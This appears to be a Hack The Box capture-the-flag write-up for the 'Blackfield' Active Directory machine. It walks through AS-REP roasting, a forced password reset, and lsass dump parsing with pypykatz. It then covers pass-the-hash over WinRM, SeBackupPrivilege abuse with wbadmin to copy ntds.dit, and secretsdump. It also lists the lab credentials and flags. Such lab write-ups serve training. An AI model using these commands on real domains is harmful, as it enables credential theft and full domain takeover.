```json
Alias: Blackfield
Date: 05-08_2024
Platform: Hackthebox
OS: Windows
Difficulty: Hard
Status: Complete
IP: 10.129.213.200
```

# Blackfield
# Summary
Backfield is a hard difficulty Windows machine featuring Windows and Active Directory misconfigurations. Anonymous / Guest access to an SMB share is used to enumerate users. Once user is found to have Kerberos pre-authentication disabled, which allows us to conduct an ASREPRoasting attack. This allows us to retrieve a hash of the encrypted material contained in the AS-REP, which can be subjected to an offline brute force attack in order to recover the plaintext password. With this user we can access an SMB share containing forensics artefacts, including an lsass process dump. This contains a username and a password for a user with WinRM privileges, who is also a member of the Backup Operators group. The privileges conferred by this privileged group are used to dump the Active Directory database, and retrieve the hash of the primary domain administrator.

# Used Tools
- Kerbrute
- bloodyAD
- pypykatz
- secretsdump
 
---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2024-08-05 16:12 PKT
Nmap scan report for 10.129.213.200
Host is up (0.24s latency).
Not shown: 992 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-05 18:12:50Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-08-05T18:13:10
|_  start_date: N/A
|_clock-skew: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.39 seconds
```
## Discovered Subdomains
```
BLACKFIELD.LOCAL
```

---
# Enumeration

## Port 445 - SMB (SMBV2)
SMB Null Session enabled.

- [x] Enumerated
- [x] Vulnerable

---

# Exploitation
A share called profiles$ contains directories with names that seem to be usernames in the AD environment. After testing the usernames with Kerbrute it seems only few are valid. We also find an account named support with no Pre-Auth enabled.

Cracking with hashmap we find these credentials

| Username | Password        |
| -------- | --------------- |
| support  | #00^BlackKnight |


---

# Lateral Movement

## Local Enumeration

### AUDIT2020
Inspecting the support account with bloodhound I found that we have 'Force-Change-Password' Permissions over AUDIT2020.
![[Pasted image 20240805173415.png]]

Change the password with bloodyAD
```bash
bloodyAD --host $IP -d BLACKFIELD.LOCAL -u support -p '#00^BlackKnight' set password audit2020 S3cret$
```

And now we own 'audit2020'

| Username  | Password |
| --------- | -------- |
| audit2020 | S3cret$  |
### SVC_BACKUP

We finally have Read access to the 'forensic' share through SMB
![[Pasted image 20240805173320.png]]

The share contains a directory named 'Memory Analysis' Which contains a lsass dump, download it and use pypykatz to extract credentials.
```bash
pypykatz lsa minidump lsass.DMP
```

Even though 'Administrator' and 'DC01$' Have sessions, their NTLM is invalid, But the NT Hash for SVC Backup is valid.

| Username   | Hash                             |
| ---------- | -------------------------------- |
| svc_backup | 9658d1d1dcd9250115e2205d9f48400d |

And we have winrm access so we can just remote into the machine.

```bash
evil-winrm -i $IP -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'
```

---

# Privilege Escalation

After logging in to the machine with svc_backup, we see that we are part of the 'Backup Operators' group, which means privilege escalation. Being in the group gives us the SeBackup and SeRestore privileges. The SeBackupPrivilege allows us to traverse any folder and list folder content. This will let us copy a file from a folder even if there is no ACE for us in it's ACL. However, we can't do this using the standard copy command. Instead, we need to programmatically copy the data, making sure to specify the [FILE_FLAG_BACKUP_SEMANTICS](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) flag.

We can use this POC to exploit this: https://github.com/giuliano108/SeBackupPrivilege

Import the dlls
```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

Make sure SeBackupPrivilege is enabled
```powershell
Set-SeBackupPrivilege
```

After making sure the privilege is enabled, You can try using diskshadow to create a shadow copy of C to get ntds.dit and system.hive, but for me disk shadow was not working for some reason. So I proceeded with WBAdmin.

First Create a backup
```powershell
wbadmin start backup -backuptarget:\\dc01\c$\Users\svc_backup\backup -include:c:\windows\ntds -quiet
```

Then get the version identifier for the above backup

```powershell
wbadmin get versions
```

and use the version identifier to restore the backup to somewhere of your choice.

```powershell
wbadmin start recovery -quiet -version:08/05/2024-22:10 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:c:\Users\svc_backup -notrestoreacl
```

Get the system hive

```
reg save HKLM\SYSTEM SYSTEM.SAV
```

download both with evil-winrm and finally extract secrets with secretsdump

```bash
secretsdump.py -ntds ./ntds.dit -system ./SYSTEM.SAV LOCAL
```

use psexec to log in and get the flags.

```bash
psexec.py administrator@$IP -hashes aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee
```

---

# Flags
- 3920bb317a0bef51027e2852be64b543
- 4375a629c7c67c8e29db269060c955cb

#CTF #CTF/Hackthebox #CTF/Hackthebox/Hard  #Windows #ActiveDirectory #ActiveDirectory/SMB #ActiveDirectory/ASREPRoasting #Windows/BackupOperators